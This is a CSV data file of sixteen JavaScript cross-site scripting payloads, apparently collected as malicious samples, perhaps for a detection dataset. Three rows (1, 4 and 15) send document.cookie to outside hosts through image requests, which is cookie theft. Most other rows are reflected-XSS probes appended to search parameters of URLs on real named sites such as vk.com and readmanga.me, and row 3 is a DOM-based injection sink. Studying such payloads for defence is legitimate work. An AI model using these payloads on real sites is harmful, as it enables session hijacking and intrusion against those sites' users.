,language,source
0,JS,<link rel=pingback href="https://hackware.ru/xmlrpc.php"/><script> alert('xss')</script>
1,JS,<script>img = new Image();img.src = "http://antichat.org/s/HakNet.gif?"+document.cookie;</script>
2,JS,http://yourdomain.ru/searh?q=»><script>alert(«cookie: «+document.cookie)</script>
3,JS,<select><script>document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
document.write("<OPTION value=2>English</OPTION>");</script></select>
4,JS,<script>img = new Image();img.src = "http://hack-academy.ru/vzlom/newhacker/350-xss-anatomiya-cross-site-scripting.html?"+document.cookie;</script>
5,JS,https://vk.com/im?q=»><script>alert(«cookie: «+document.cookie)</script>
6,JS,https://www.championat.com/other/article-3376961-plovec-mihail-muhodinov-utonul-posle-pobedy-kak-eto-bylo-kto-vinovat.html?q=»><script>alert(«cookie: «+document.cookie)</script>
7,JS,http://bigpicture.ru/p/790398-amerikanka-pokazala-v-facebook-kak-na-samom-dele-vyglyadit-materinstvo-srazu-posle-rodov?q=»><script>alert(«cookie: «+document.cookie)</script>
8,JS,https://www.securitylab.ru/analytics/432835.php?q=»><script>alert(«cookie: «+document.cookie)</script>
9,JS,http://mazahaka.0pk.ru/viewtopic.php?q=»><script>alert(«cookie : «+document.cookie)</script>
10,JS,http://xssvulns.blogspot.ru/2012/02/cookie.html?q=»><script>alert(«cookie: «+document.cookie)</script>
11,JS,http://readmanga.me/?offset=30&max=30?q=»><script>alert(«cookie: «+document.cookie )</script>
12,JS,http://readmanga.me/overlord?q=»><script>alert(«cookie: «+ document.cookie )</script>
13,JS,http://readmanga.me/collection/prodavaemaia_manga?q=»><script>alert(«  cookie: «+document.cookie )</script>
14,JS,http://findanime.me/cheburashka?q=»><script>alert(«cookie: «+document.cookie)</script>
15,JS,http://xssvulns.blogspot.ru/2012/02/cookie.html="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
